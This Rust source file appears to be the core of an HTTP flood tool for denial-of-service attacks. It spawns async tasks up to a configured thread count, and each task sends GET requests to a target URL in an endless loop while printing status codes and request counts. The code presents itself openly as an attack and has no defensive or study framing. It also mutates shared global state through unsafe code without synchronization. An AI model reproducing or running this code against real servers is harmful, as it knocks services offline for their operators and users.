use core::time;
use std::thread;

use reqwest::Response;
use tokio::time::Instant;

use crate::ram_manger::{SAFE_PUB_VAR, UNSAFE_PUB_VAR};
use crate::where_attack::AttackData;

pub async fn start(passed_var: AttackData) {
    loop {
        core_attack(&passed_var);
    }
}

fn core_attack(passed_var: &AttackData) {
    let error_threads = SAFE_PUB_VAR.lock();
    match error_threads {
        Err(_) => {}
        Ok(mut threads) => {
            if threads.thread_on + 1 < passed_var.threads {
                threads.thread_on += 1;
                unsafe {
                    UNSAFE_PUB_VAR.threads_on += 1;
                }
                drop(threads);
                tokio::spawn(async {
                    loop {
                        let now = Instant::now();
                        unsafe {
                            let error_data = request(&UNSAFE_PUB_VAR.attack_url);
                            match error_data.await {
                                Ok(status_code) => {
                                    UNSAFE_PUB_VAR.amount_sent += 1;
                                    println!(
                                        "Threads on {},\n Status code {},\n Time Passed for request {} sec,\n Request per 10 Millisecond {}",
                                        UNSAFE_PUB_VAR.threads_on,
                                        status_code.status(),
                                        now.elapsed().as_secs(),
                                        UNSAFE_PUB_VAR.amount_sent,
                                    );
                                }
                                Err(data) => {
                                    println!(
                                        "Threads on {}, Status ERROR {}\n Time: {}\n Request per 10 Millisecond {}",
                                        UNSAFE_PUB_VAR.threads_on,
                                        data,
                                        now.elapsed().as_secs(),
                                        UNSAFE_PUB_VAR.amount_sent
                                    );
                                }
                            }
                        }
                    }
                });
            } else {
                time_function();
            }
        }
    }
}

fn time_function() {
    unsafe {
        UNSAFE_PUB_VAR.threads_on += 1;
        loop {
            UNSAFE_PUB_VAR.amount_sent = 0;
            thread::sleep(time::Duration::from_millis(10));
        }
    }
}

async fn request(url: &String) -> Result<Response, reqwest::Error> {
    reqwest::Client::new().get(url).send().await
}
